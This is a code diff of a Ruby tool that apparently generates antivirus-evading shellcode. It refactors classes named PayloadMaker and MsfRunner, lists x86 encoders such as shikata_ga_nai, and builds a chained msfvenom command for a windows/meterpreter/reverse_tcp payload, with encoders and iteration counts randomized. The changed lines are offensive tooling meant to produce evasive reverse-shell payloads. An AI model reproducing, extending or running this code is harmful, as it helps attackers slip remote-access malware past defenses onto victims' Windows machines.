@@ -8,9 +8,9 @@ require 'antisandbox'
 
 class PayloadMaker
 
-    def initialize(shellcode,encoder=true)
-        @shellcode = shellcode
-        @encoder = encoder
+    def initialize(options = {})
+        @shellcode = options[:shellcode]
+        @encoder = options[:encoder] || true
         #@platform = platform
     end
 
@@ -323,22 +323,24 @@ end
 
 
 class MsfRunner
-    def initialize(payload='windows/meterpreter/reverse_tcp',host='127.0.0.1',port='4444',others='',debug=false)
-        @payload = payload 
-        @host = host 
-        @port = port  
-        @others = others
-        @debug = debug
+    def initialize(options = {})
+        @payload = options[:payload] || 'windows/meterpreter/reverse_tcp'
+        @host = options[:host] || '127.0.0.1'
+        @port = options[:port] || '4444'
+        @others = options[:others] || ''
+        @debug = options[:debug] || false
         #@platform = platform
     end
 
     def get_encoder
-        encoder_array_all = ["x86/bloxor",
-                            "x86/call4_dword_xor",
-                            "x86/countdown",
-                            "x86/fnstenv_mov",
-                            "x86/jmp_call_additive",
-                            "x86/shikata_ga_nai"]
+        encoder_array_all = [   
+                                "x86/bloxor",
+                                "x86/call4_dword_xor",
+                                "x86/countdown",
+                                "x86/fnstenv_mov",
+                                "x86/jmp_call_additive",
+                                "x86/shikata_ga_nai"
+                            ]
                             
                             
         encoder_array = ["x86/shikata_ga_nai"]
@@ -361,7 +363,7 @@ class MsfRunner
     def run
         msf_check()
         encoder_array = get_encoder
-        msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f raw -e #{encoder_array[0]} -i #{random_number(10..15)} |"
+        msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f raw -e #{encoder_array[0]} -i #{random_number(5..15)} |"
         msfstring << "msfvenom -e #{encoder_array[1]} -a x86 --platform windows -f raw -i #{random_number(2..4)} |"
         msfstring << "msfvenom -e #{encoder_array[2]} -a x86 --platform windows -f c -i #{random_number(2..4)}"
 
